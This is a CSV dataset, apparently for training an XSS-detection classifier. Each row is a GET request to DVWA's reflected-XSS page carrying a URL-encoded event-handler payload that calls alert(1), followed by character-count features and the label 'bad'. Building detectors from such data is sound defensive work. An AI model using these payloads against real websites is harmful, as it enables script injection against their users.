Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Class
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onmouseleave%3d%22alert(1)%22%3etest%3c%2farea%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onmousemove%3d%22alert(1)%22%3etest%3c%2farea%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onmouseout%3d%22alert(1)%22%3etest%3c%2farea%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onmouseover%3d%22alert(1)%22%3etest%3c%2farea%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onmouseup%3d%22alert(1)%22%3etest%3c%2farea%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carea%20onpaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2farea%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20draggable%3d%22true%22%20ondrag%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20draggable%3d%22true%22%20ondragend%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20draggable%3d%22true%22%20ondragenter%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20draggable%3d%22true%22%20ondragleave%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20draggable%3d%22true%22%20ondragstart%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20onactivate%3dalert(1)%3e%3c%2farticle%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20onbeforeactivate%3dalert(1)%3e%3c%2farticle%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dalert(1)%3e%3c%2farticle%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20ondeactivate%3dalert(1)%3e%3c%2farticle%3e%3cinput%20id%3dy%20autofocus%3e,,0,0,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20onfocus%3dalert(1)%3e%3c%2farticle%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20id%3dx%20tabindex%3d1%20onfocusin%3dalert(1)%3e%3c%2farticle%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onbeforecopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onbeforecut%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onbeforepaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onblur%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2farticle%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onclick%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20oncontextmenu%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20oncopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20oncut%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20ondblclick%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onfocusout%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2farticle%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onkeydown%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onkeypress%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onkeyup%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmousedown%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmouseenter%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmouseleave%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmousemove%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmouseout%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmouseover%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onmouseup%3d%22alert(1)%22%3etest%3c%2farticle%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3carticle%20onpaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2farticle%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20draggable%3d%22true%22%20ondrag%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20draggable%3d%22true%22%20ondragend%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20draggable%3d%22true%22%20ondragenter%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20draggable%3d%22true%22%20ondragleave%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20draggable%3d%22true%22%20ondragstart%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20onactivate%3dalert(1)%3e%3c%2faside%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20onbeforeactivate%3dalert(1)%3e%3c%2faside%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dalert(1)%3e%3c%2faside%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20ondeactivate%3dalert(1)%3e%3c%2faside%3e%3cinput%20id%3dy%20autofocus%3e,,0,0,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20onfocus%3dalert(1)%3e%3c%2faside%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20id%3dx%20tabindex%3d1%20onfocusin%3dalert(1)%3e%3c%2faside%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onbeforecopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onbeforecut%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onbeforepaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onblur%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2faside%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onclick%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20oncontextmenu%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20oncopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20oncut%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20ondblclick%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onfocusout%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2faside%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onkeydown%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onkeypress%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onkeyup%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmousedown%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmouseenter%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmouseleave%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmousemove%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmouseout%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmouseover%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onmouseup%3d%22alert(1)%22%3etest%3c%2faside%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caside%20onpaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2faside%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20controls%20onpause%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20controls%20onseeked%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20controls%20onseeking%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20controls%20onvolumechange%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20onloadedmetadata%3dalert(1)%3e%20%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20onplay%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,4,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20autoplay%20onplaying%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,4,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20controls%20autoplay%20onended%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20controls%20autoplay%20ontimeupdate%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,5,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20draggable%3d%22true%22%20ondrag%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20draggable%3d%22true%22%20ondragend%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20draggable%3d%22true%22%20ondragenter%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20draggable%3d%22true%22%20ondragleave%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20draggable%3d%22true%22%20ondragstart%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20controls%20onfocus%3dalert(1)%20id%3dx%3e%3csource%20src%3d%22validaudio%2ewav%22%3e%3c%2faudio%3e,,0,2,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20controls%20onfocusin%3dalert(1)%20id%3dx%3e%3csource%20src%3d%22validaudio%2ewav%22%3e%3c%2faudio%3e,,0,2,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20tabindex%3d1%20onactivate%3dalert(1)%3e%3c%2faudio%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20tabindex%3d1%20onbeforeactivate%3dalert(1)%3e%3c%2faudio%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dalert(1)%3e%3c%2faudio%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20id%3dx%20tabindex%3d1%20ondeactivate%3dalert(1)%3e%3c%2faudio%3e%3cinput%20id%3dy%20autofocus%3e,,0,0,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onbeforecopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onbeforecut%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onbeforepaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onblur%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2faudio%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20oncanplay%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,3,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onclick%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20oncontextmenu%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20oncopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20oncut%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20ondblclick%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onfocusout%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2faudio%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onkeydown%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onkeypress%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onkeyup%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onloadeddata%3dalert(1)%3e%3csource%20src%3d%22validaudio%2ewav%22%20type%3d%22audio%2fwav%22%3e%3c%2faudio%3e,,0,4,0,1,3,6,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmousedown%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmouseenter%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmouseleave%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmousemove%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmouseout%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmouseover%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onmouseup%3d%22alert(1)%22%3etest%3c%2faudio%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20onpaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2faudio%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%2fonerror%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20draggable%3d%22true%22%20ondrag%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20draggable%3d%22true%22%20ondragend%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20draggable%3d%22true%22%20ondragenter%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20draggable%3d%22true%22%20ondragleave%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20draggable%3d%22true%22%20ondragstart%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,4,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20onactivate%3dalert(1)%3e%3c%2fb%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20onbeforeactivate%3dalert(1)%3e%3c%2fb%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dalert(1)%3e%3c%2fb%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20ondeactivate%3dalert(1)%3e%3c%2fb%3e%3cinput%20id%3dy%20autofocus%3e,,0,0,0,1,5,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20onfocus%3dalert(1)%3e%3c%2fb%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20id%3dx%20tabindex%3d1%20onfocusin%3dalert(1)%3e%3c%2fb%3e,,0,0,0,1,3,4,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onbeforecopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2fb%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onbeforecut%3d%22alert(1)%22%20contenteditable%3etest%3c%2fb%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onbeforepaste%3d%22alert(1)%22%20contenteditable%3etest%3c%2fb%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onblur%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2fb%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onclick%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,2,0,1,1,4,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20oncontextmenu%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20oncopy%3d%22alert(1)%22%20contenteditable%3etest%3c%2fb%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20oncut%3d%22alert(1)%22%20contenteditable%3etest%3c%2fb%3e,,0,2,0,1,2,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20ondblclick%3d%22alert(1)%22%3etest%3c%2fb%3e,,0,2,0,1,1,4,0,0,0,1,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cb%20onfocusout%3dalert(1)%20tabindex%3d1%20id%3dx%3e%3c%2fb%3e%3cinput%20autofocus%3e,,0,0,0,1,4,6,0,0,1,0,0,bad
